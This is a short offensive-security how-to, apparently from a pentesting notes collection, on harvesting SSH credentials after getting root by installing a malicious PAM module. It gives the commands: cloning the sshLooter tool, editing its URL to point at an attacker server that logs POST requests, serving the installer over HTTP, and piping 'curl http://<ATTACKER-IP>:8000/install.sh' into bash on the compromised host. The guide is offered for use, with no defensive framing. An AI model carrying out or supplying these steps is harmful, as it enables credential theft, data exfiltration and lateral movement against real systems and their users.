# Stealing SSH Credentials

You have compromised a remote machine and get root and youu would like to collect as many credentials as possible to move laterally.

We can do steal ssh credentials thoud `a malicious PAM module`

Every SSH connection attempt will be forwarded to a server under your control, accompanied by the credentials used for this connection attempts

**On attacking machine**

```sh
sudo git clone https://github.com/mthbernarder/sshLooter.git
```

Host and edit `install.sh` and `looter.py` pointing the url variable to a server under your control, that can log POST request.

```sh
python3 -m http.server 8000
```

**On the compromised machine:**

```
curl http://<ATTACKER-IP>:8000/install.sh | bash
```